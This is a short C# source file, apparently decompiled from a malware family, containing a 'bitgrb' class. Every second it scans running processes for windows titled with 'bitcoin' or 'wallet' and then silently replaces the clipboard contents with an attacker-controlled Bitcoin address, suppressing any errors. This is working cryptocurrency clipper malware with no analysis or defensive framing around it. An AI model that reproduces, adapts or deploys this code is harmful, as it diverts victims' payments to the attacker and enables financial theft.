using System;
using System.Diagnostics;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lime;
using Microsoft.VisualBasic.CompilerServices;

public class bitgrb
{
	private static System.Timers.Timer Timer;

	public static void scanIt()
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (!(process.MainWindowTitle.ToLower().Contains("BITCOIN".ToLower()) | process.MainWindowTitle.ToLower().Contains("WALLET".ToLower())))
			{
				continue;
			}
			try
			{
				Thread thread = new Thread(delegate(object a0)
				{
					Clipboard.SetText(Conversions.ToString(a0));
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(Core.BTC_ADD);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Start()
	{
		Timer = new System.Timers.Timer(1000.0);
		Timer.Elapsed += delegate
		{
			scanIt();
		};
		Timer.Enabled = true;
	}

	public static void stopme()
	{
		Timer.Elapsed += delegate
		{
			scanIt();
		};
		Timer.Stop();
	}
}
